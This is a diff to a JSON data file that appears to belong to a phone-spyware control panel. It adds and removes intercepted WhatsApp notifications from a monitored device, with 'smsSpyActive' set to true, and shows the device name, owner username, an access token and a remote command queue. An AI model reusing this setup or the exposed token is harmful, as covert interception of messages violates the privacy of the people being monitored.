@@ -23,6 +23,30 @@
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
+        "content": "‎‎1734 pesan dari 14 chat",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082038703
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1733 pesan dari 14 chat",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082036293
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1262 pesan): ~ 🧚‍♀️",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082036268
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
         "content": "‎‎1732 pesan dari 14 chat",
         "time": "02/04 06:20",
         "pkg": "com.whatsapp",
@@ -3995,30 +4019,6 @@
         "time": "02/04 04:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1775074566007
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (26 pesan): ~ STR",
-        "content": "📷 550+",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565943
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (282 pesan): ~ raxz",
-        "content": "bagi link download pegasus oi",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565770
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (1151 pesan): ~ Hoi?",
-        "content": "halo jga",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565614
       }
     ],
     "galleryPhotos": [],
@@ -4065,6 +4065,38 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1263 pesan): ~ 🧚‍♀️",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082038744
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1734 pesan dari 14 chat",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082038720
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (1262 pesan): ~ 🧚‍♀️",
+        "content": "Jenis pesan tidak diketahui",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082036317
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1733 pesan dari 14 chat",
+        "time": "02/04 06:20",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775082036242
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -8032,38 +8064,6 @@
         "time": "02/04 04:16",
         "pkg": "com.whatsapp",
         "receivedAt": 1775074566057
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1622 pesan dari 14 chat",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565896
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗚𝗕 𝗜𝗦𝗜𝗔𝗡 𝗕𝗬 𝗭𝗜𝗟 𝗫 𝗢𝗪𝗡 #𝟭 (26 pesan): ~ STR",
-        "content": "📷 550+",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565829
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎All Buyer Pegasus-X ( No Update ) (282 pesan): ~ raxz",
-        "content": "bagi link download pegasus oi",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565713
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (1151 pesan): ~ Hoi?",
-        "content": "halo jga",
-        "time": "02/04 04:16",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775074565641
       }
     ],
     "galleryPhotos": [],
@@ -8483,7 +8483,7 @@
     "deviceName": "HP-AHMADDDD1-4708",
     "ownerUsername": "Axmadz",
     "token": "520070cf4248976c6a5bc8d7767d78d8",
-    "lastSeen": 1775082033246,
+    "lastSeen": 1775082036359,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T17:49:10.524Z",
